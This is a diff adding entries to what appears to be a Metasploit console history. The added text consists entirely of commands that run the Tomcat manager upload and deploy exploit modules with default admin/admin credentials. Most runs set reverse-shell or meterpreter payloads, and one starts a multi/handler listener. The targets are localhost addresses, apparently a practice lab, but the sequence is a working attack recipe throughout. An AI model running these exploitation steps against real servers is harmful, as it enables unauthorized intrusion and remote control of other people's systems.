@@ -103,3 +103,116 @@ set password admin
 exploit
 exploit
 exploit
+use exploit/multi/http/tomcat_mgr_upload
+show options
+set HttpPassword admin
+set HttpUsername admin
+set RHOST localhost
+set RPORT 8080
+set TARGETURI /manager/html
+exploit
+show targets
+set TARGET 0
+exploit
+set LHOST localhost
+set LPORT 8082
+exploit
+set TARGET 2
+exploit
+set TARGET 0
+exploit
+set paylod linux/x86/shell_reverse_tcp
+exploit
+set TARGETURI /manager/html/upload
+exploit
+set TARGETURI /manager/html/upload
+exit
+use exploit/multi/http/tomcat_mgr_deploy
+show options
+set HttpPassword admin
+set HttpUsername admin
+set RHOST localhost
+set RPORT 8080
+set LHOST localhost
+set LPORT 8082
+exploit
+set payload linux/x86/shell_reverse_tcp
+set payload linux/x86/shell_reverse_tcp
+show
+show payloads
+set payload java/shell_reverse_tcp
+exploit
+set payload java/shell/reverse_tcp
+exploit
+set payload java/meterpreter/reverse_tcp
+exploit
+set LPORT 4444
+exploit
+show targets
+set TARGET 1
+exploit
+show payloads
+set payload generic/shell_reverse_tcp
+show payloads
+exploit
+set payload java/meterpreter/reverse_http
+exploit
+exploit
+set LHOST 127.0.0.3
+exploit
+use multi/handler
+set payload java/meterpreter/reverse_http
+set LHOST 127.0.0.3
+exploit
+set LPORT 4444
+exploit
+use exploit/multi/http/tomcat_mgr_deploy
+exit
+use exploit/multi/http/tomcat_mgr_deploy
+show options
+set HttpPassword admin
+set HttpUsername admin
+set RHOST 127.0.0.1
+set RPORT 8080
+check
+exploit
+exploit
+exploit
+exploit
+exploit
+show payloas
+show -h
+show targets
+show options
+show exploits
+show payloads
+exit
+exploit
+show targets
+set target 1
+exploit
+exploit
+show payloads
+set payload java/meterpreter/reverse_tcp
+exploit
+exit
+exploit
+show targets
+set TARGET 1
+show targets
+exploit
+exploit
+check
+show options
+set PATH /manager/html
+exploit
+exit
+exit
+exploit
+exit
+exploit
+exit
+exploit
+exit
+exploit
+exit
